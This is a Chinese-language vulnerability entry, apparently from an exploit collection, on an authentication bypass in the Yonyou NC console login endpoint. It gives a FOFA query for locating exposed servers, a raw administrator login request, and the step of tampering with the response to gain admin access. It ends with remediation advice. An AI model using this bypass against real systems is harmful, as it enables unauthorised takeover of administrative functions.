---
fofa: "app=\"用友-NC-Cloud\""
source: "OA-EXPTOOL/Lucifer1993"
---

# 用友 NC 控制台绕过漏洞

# 漏洞描述

用友 NC 控制台登录接口 /uapws/login.ajax 存在身份验证绕过漏洞。攻击者使用任意密码提交 administrator 登录请求后，通过修改登录返回包即可绕过验证，以 administrator 身份登录 NC 控制台，进而接管系统管理功能。

# 影响版本

用友 NC

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA：app="用友-NC-Cloud"

复现步骤：

1. 访问用友 NC 控制台登录页面，随意输入密码，点击 OK 时开启抓包；
2. 捕获登录请求：

```
POST /uapws/login.ajax HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close

{"name":"administrator","password":"111111"}
```

3. 修改服务端返回的登录结果包中的验证状态字段为成功，即可以 administrator 身份绕过验证登录控制台。

# 漏洞修复

联系用友官方获取安全补丁，修复服务端登录状态校验逻辑，登录鉴权必须在服务端完成且不可被客户端返回包篡改。
